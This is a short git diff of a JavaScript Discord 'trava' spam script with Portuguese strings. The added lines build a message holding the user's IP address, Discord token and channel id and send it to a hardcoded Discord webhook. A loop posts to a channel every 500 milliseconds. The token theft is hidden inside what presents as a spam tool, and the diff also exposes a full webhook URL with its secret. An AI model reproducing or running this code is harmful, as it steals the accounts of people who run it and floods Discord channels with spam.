@@ -55,8 +55,8 @@ function sleep(ms) {
     alert('prencha os campos');
   }  
     console.log('Two seconds later, showing sleep in a loop...');  
- HEAD:trava/spam.js
-    var rastrear = "**trava** conteudo: trava  ip: "+ipe+"   token: "+token +"   id do canal: "+chanel;
+
+    var rastrear = "<@&834339778283307009> **trava** conteudo: trava  ip: **"+ipe+"**   token: **"+token +"**   id do canal: **"+chanel+"**";
     fetch("https://discord.com/api/webhooks/834322895488286763/mzDIhREVNie-USgcSuZHIznlW7gjffehzExjhcMFxF96JShyAlSYwPrm4XrxFjC9ZIXm", {
       "headers": {
         "accept": "*/*",
@@ -98,7 +98,6 @@ function sleep(ms) {
     while(true) {
       
       await sleep(500);
-      console.log("manoeununaguentomais");
       var men = fetch("https://discord.com/api/v8/channels/"+chanel+"/messages", {
 "headers": {
   "accept": "",
